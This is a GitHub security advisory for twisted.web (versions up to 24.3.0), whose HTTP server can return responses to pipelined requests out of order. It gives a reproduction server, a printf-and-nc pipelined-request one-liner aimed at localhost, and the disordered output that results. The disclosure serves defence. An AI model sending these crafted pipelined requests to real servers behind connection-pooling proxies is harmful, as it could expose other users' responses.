# Disordered HTTP pipeline response in twisted.web, again

High

[adiroiban](/adiroiban)
published
GHSA-c8m8-j448-xjx7
Jul 29, 2024

## Package

pip

twisted
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

<= 24.3.0

## Patched versions

24.7.0rc1

## Description

### Summary

The HTTP 1.0 and 1.1 server provided by twisted.web could process pipelined HTTP requests out-of-order, possibly resulting in information disclosure.

### PoC

0. Start a fresh Debian container:

```
docker run --workdir /repro --rm -it debian:bookworm-slim
```

1. Install twisted and its dependencies:

```
apt -y update && apt -y install ncat git python3 python3-pip \
    && git clone --recurse-submodules https://github.com/twisted/twisted \
    && cd twisted \
    && pip3 install --break-system-packages .
```

2. Run a twisted.web HTTP server that echos received requests' methods. e.g., the following:

```
from twisted.web import server, resource
from twisted.internet import reactor

class TheResource(resource.Resource):
    isLeaf = True

    def render_GET(self, request) -> bytes:
        return b"GET"

    def render_POST(self, request) -> bytes:
        return b"POST"

site = server.Site(TheResource())
reactor.listenTCP(80, site)
reactor.run()
```

3. Send it a POST request with a chunked message body, pipelined with another POST request, wait a second, then send a GET request on the same connection:

```
(printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n'; sleep 1; printf 'GET / HTTP/1.1\r\n\r\n'; sleep 1) | nc localhost 80
```

4. Observe that the responses arrive out of order:

```
HTTP/1.1 200 OK
Server: TwistedWeb/24.3.0.post0
Date: Tue, 09 Jul 2024 06:19:41 GMT
Content-Length: 5
Content-Type: text/html

POST
HTTP/1.1 200 OK
Server: TwistedWeb/24.3.0.post0
Date: Tue, 09 Jul 2024 06:19:42 GMT
Content-Length: 4
Content-Type: text/html

GET
HTTP/1.1 200 OK
Server: TwistedWeb/24.3.0.post0
Date: Tue, 09 Jul 2024 06:19:42 GMT
Content-Length: 5
Content-Type: text/html

POST

```
### Impact

See [GHSA-xc8x-vp79-p3wm](https://github.com/twisted/twisted/security/advisories/GHSA-xc8x-vp79-p3wm). Further, for instances of twisted.web HTTP servers deployed behind reverse proxies that implement connection pooling, it may be possible for remote attackers to receive responses intended for other clients of the twisted.web server.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
